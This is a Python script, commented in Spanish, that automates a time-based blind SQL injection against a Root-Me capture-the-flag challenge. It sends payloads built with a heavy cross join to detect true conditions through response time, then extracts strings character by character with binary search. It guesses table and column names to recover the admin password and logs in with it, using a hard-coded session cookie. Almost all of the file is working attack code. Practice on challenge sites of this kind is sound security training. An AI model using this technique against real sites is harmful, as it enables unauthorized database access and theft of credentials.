#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 43 - PROBAR DIFERENTES SINTAXIS DE CONSULTA
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.threshold = 35
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t < self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        print(f"    Query: {query}")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.1)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedSQLInjector()

print("="*70)
print("  PROBANDO DIFERENTES SINTAXIS DE CONSULTA")
print("="*70)

# 1. Verificar técnica
print("\n[1] Verificando técnica...")
print(f"  1=1: {injector.is_true('1=1')} (debería ser True)")
print(f"  1=2: {injector.is_true('1=2')} (debería ser False)")

if not (injector.is_true('1=1') == True and injector.is_true('1=2') == False):
    print("  ❌ Técnica NO funciona")
    exit()

print("  ✅ Técnica funciona correctamente")

# 2. Probar diferentes sintaxis para SELECT
print("\n[2] Probando diferentes sintaxis:")

sintaxis = [
    ("SELECT 'admin'", "SELECT 'admin'"),
    ("SELECT 'admin' FROM DUAL", "SELECT 'admin' FROM DUAL"),
    ("SELECT 'admin' FROM users LIMIT 1", "SELECT 'admin' FROM users LIMIT 1"),
    ("(SELECT 'admin')", "(SELECT 'admin')"),
    ("(SELECT 'admin' FROM DUAL)", "(SELECT 'admin' FROM DUAL)"),
    ("(SELECT 'admin' FROM users LIMIT 1)", "(SELECT 'admin' FROM users LIMIT 1)"),
]

for query, desc in sintaxis:
    print(f"\n  Probando: {desc}")
    resultado = injector.extract_string(query, desc)
    print(f"    Resultado: '{resultado}'")
    if resultado == "admin":
        print(f"    ✅ ¡ÉXITO! Sintaxis correcta: {desc}")
        break

# 3. Si encontramos la sintaxis correcta, extraer contraseña
print("\n[3] Extrayendo datos de la tabla...")

# Probar diferentes tablas y columnas
tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores']
columnas_user = ['username', 'user', 'login', 'name']
columnas_pass = ['password', 'pass', 'pwd', 'clave', 'contrasena']

for tabla in tablas:
    print(f"\n  Probando tabla: {tabla}")
    
    # Verificar si la tabla existe
    if not injector.is_true(f"EXISTS(SELECT * FROM {tabla})"):
        print(f"    ❌ Tabla no existe")
        continue
    
    print(f"    ✅ Tabla existe")
    
    # Buscar columna de usuario
    for col_user in columnas_user:
        if injector.is_true(f"EXISTS(SELECT {col_user} FROM {tabla})"):
            print(f"    ✅ Columna usuario: {col_user}")
            
            # Verificar si contiene 'admin'
            if injector.is_true(f"EXISTS(SELECT {col_user} FROM {tabla} WHERE {col_user}='admin')"):
                print(f"      ✅ 'admin' encontrado en {tabla}.{col_user}")
                
                # Extraer el admin
                query_user = f"SELECT {col_user} FROM {tabla} WHERE {col_user}='admin'"
                admin = injector.extract_string(query_user, f"Admin de {tabla}.{col_user}")
                print(f"      Admin: '{admin}'")
                
                # Buscar contraseña
                for col_pass in columnas_pass:
                    if injector.is_true(f"EXISTS(SELECT {col_pass} FROM {tabla})"):
                        query_pass = f"SELECT {col_pass} FROM {tabla} WHERE {col_user}='admin'"
                        password = injector.extract_string(query_pass, f"Contraseña de {tabla}.{col_pass}")
                        print(f"      Contraseña: '{password}'")
                        
                        # Verificar credenciales
                        data = {"username": "admin", "password": password}
                        r = requests.post(URL + "?action=login", data=data, cookies=injector.session.cookies)
                        
                        if "Authentification error" not in r.text:
                            print("\n" + "="*70)
                            print(f"  ✅ ¡CREDENCIALES CORRECTAS!")
                            print(f"  Usuario: admin")
                            print(f"  Contraseña: {password}")
                            print("="*70)
                            exit(0)
